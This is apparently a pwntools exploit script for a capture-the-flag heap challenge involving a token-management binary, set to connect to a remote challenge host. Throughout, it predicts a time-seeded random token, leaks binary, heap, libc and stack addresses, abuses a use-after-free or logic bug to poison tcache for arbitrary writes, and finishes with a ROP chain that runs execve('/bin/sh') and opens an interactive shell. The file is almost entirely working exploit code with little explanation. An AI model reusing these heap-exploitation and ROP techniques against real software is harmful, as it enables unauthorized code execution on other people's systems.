#!/usr/bin/env python3

from pwn import *
import ctypes
import time

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

context.binary = exe
rd = ctypes.CDLL("libc.so.6")

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*Token_Import_Handler+215
        b*Token_Import_Handler+679
        b*Token_Decrypt_Handler+90
        b*Token_Create_Handler+17
        b*0x55555555645a
        c
        ''')
        sleep(1)

#  nc 67.223.119.69 3638 
if args.REMOTE:
    p = remote('67.223.119.69', 3638)
else:
    p = process([exe.path])
seed = int(time.time())
a = rd.srand(seed)
Global_Security_Token = rd.rand() << 32 | rd.rand()
# input()
def create(name, password):
    sla(b'Enter your choice: ', b'1')
    sla(b'Enter name: ', name)
    sla(b'nter password: ', password)


def import_token(format, idx):
    sla(b'Enter your choice: ', b'7')
    sla(b'(Format: Hex_Name:Hex_Password:Security_Token): ', format)
    sla(b'(must be the existing one): ', idx)

create(b'1', b'1')

load = p8(0x1)*65 + b':' + p8(2)*65 + b':' + b'0x0'

import_token(load, b'0')

def show():
    sla(b'Enter your choice: ', b'4')
    ru(b'Name: ')

show()
Global_Security_Token = u64(r(8))
info(f'Global_Security_Token: {hex(Global_Security_Token)}')

def export_token(idx):
    sla(b'Enter your choice: ', b'6')
    slna(b'Enter index to export: ', idx)

def delete(idx):
    sla(b'Enter your choice: ', b'3')
    slna(b'Enter index to remove: ', idx)

export_token(0)
ru(b'Private Token: ')
private_leak = int(p.recvline()[:-1], 10 )
info(f'private leak: {hex(private_leak)}')

binary_leak = private_leak ^ (Global_Security_Token >> 12)
exe.address = binary_leak -0x5160
info(f'binary leak: {hex(binary_leak)}')
info(f'binary base: {hex(exe.address)}')

# for i in range(17):
#     a = f'{i}'.encode()
#     create(a, a)
# for i in range(17):
#     delete(i)
create(b'1', b'2')
create(b'1', b'2')
create(b'1', b'2')
# input("Evil coming")
"""
Trigger uaf by free 3 --> 2 --> uaf 2
"""
# delete(3)
# delete(2)
for i in range(0xfd):
    evil = f'{i}'.encode() * 0x20
    create(evil, evil)
# input("Evil coming")

create(b'a'*7, b'evil is here')
show()

ru(b'Name: aaaaaaa\n')
heap_leak = u64(r(6) + b'\0\0')
info(f'heap leak: {hex(heap_leak)}')
heap_base = heap_leak - 0x3ad0
info(f'heap base: {hex(heap_base)}')
delete(0)
delete(0)

def token_insert(idx, name, password):
    sla(b'Enter your choice: ', b'2')
    slna(b'Enter index to insert: ', idx)
    sla(b'Enter name: ', name)
    sla(b'Enter password: ', password)

token_insert(256, b'hahahaha is here',b'evil??? ahahaha' )
delete(257)
victim = heap_base +0x3ae0
target = heap_base +0x90
def math(ptr1,ptr2):
    a = (ptr1 >> 12) ^ ptr2
    return (a)

b = Global_Security_Token ^ math(victim, target)

load = flat(
    p8(1)*65, b':',
    p8(2)*65, b':',
    f'{b}'.encode()
    
)
print(load)
import_token(load, b'255')
print(hex(Global_Security_Token).encode())

# token_insert(257, b'???', b'how did you get here')

"""
###################

control tcache_per_thread at idx 257

##################
"""

create(b'???', b'true?')
# target 0x55555555c090

load_1 = flat(
    b'a'*0x10,
    b'evil_is'
)

load_2 = flat(
    b'\0'
)
create(load_1, load_2)

for i in range(6):
    delete(0)

# now evil idx = 251

def edit(idx, name, password):
    sla(b'Enter your choice: ', b'5')
    slna(b'Enter index to edit: ', idx)
    sla(b'nter new name: ', name)
    sla(b'nter new password: ', password)

load_1 = flat(
    b'a'*0x10, 
    exe.address +0x5000,
)

edit(251, load_1, b'\0')

# bss 
create(b'a'*0xf, b'1')
# now evil idx = 251

show()
ru(b'Index 252: Name: aaaaaaaaaaaaaaa\n')
libc_leak = u64(r(6) + b'\0\0')
libc.address  =libc_leak-0x2045c0
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

edit(252, b'a', p64(libc.sym._IO_2_1_stdin_))
# now evil idx = 251

load_1 = flat(
    b'a'*0x10, 
    libc.sym.environ-0x28
)

edit(251, load_1, b'\0')


create(b'w'*0x17, b'1')
show()
ru(b'Name: wwwwwwwwwwwwwwwwwwwwwww\n')
stack_leak = u64(r(6) + b'\0\0')
info(f'stack leak: {hex(stack_leak)}')

load_1 = flat(
    b'a'*0x10, 
    stack_leak -0x168-0x10
)
GDB()

edit(251, load_1, b'\0')


pop_rdi = 0x000000000010f78b+ libc.address
pop_rsi  = 0x000000000010f789 + libc.address
pop_rdx = 0x00000000000981ad+ libc.address
pop_rax = 0x00000000000dd237 + libc.address
syscall = 0x0000000000098c32 + libc.address
sla(b'Enter your choice: ', b'7')

load = flat(
    b'a'*0x50,
    pop_rdi,
    next(libc.search(b'/bin/sh\0')),
    pop_rsi,
    0,
    0,
    pop_rax,
    0x3b,
    syscall
)

sla(b'ex_Name:Hex_Password:Security_Token): ', load)
rbp= exe.address +0x50a8
load_1 = flat(
    rbp,
    # # stack_leak-0x158+0x20,
    pop_rdx,
    0,
    # b'a'*0x20
)
# # load_2 = 
sla(b'Enter your choice: ', b'1')
sla(b'Enter name: ', load_1)
print(load_1)
"""
logic bug: 
Token_Insert_Handler
Token_Remove_Handler

"""

p.interactive()
